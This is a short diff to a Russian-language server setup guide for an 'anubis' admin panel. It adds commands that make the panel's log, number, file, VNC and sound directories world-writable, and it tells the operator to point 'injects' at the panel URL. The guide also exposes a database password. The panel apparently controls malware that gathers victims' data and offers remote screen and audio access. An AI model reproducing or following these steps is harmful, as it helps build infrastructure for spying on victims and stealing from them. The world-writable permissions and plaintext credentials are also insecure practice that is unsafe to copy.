@@ -50,6 +50,14 @@ mv phpmyadmin /var/www/html
 cd /var/www/html/site
 mysql -u anubis -p anubisdb < mysql.sql
 password; @34fsedaanubis
+cd /var/www/html/site
+chmod 777 anubis/application/datalogs/logs
+chmod 777 anubis/application/datalogs/numers
+chmod 777 anubis/application/datalogs/files
+chmod 777 anubis/application/websocket/VNC
+chmod 777 anubis/application/websocket/sound
+Указываем URL админ панели инжектам, так же инжекты можно размещать отдельно от админ панели!
+/site/inj/config.php
 _______________
 
 UFW; FireWall
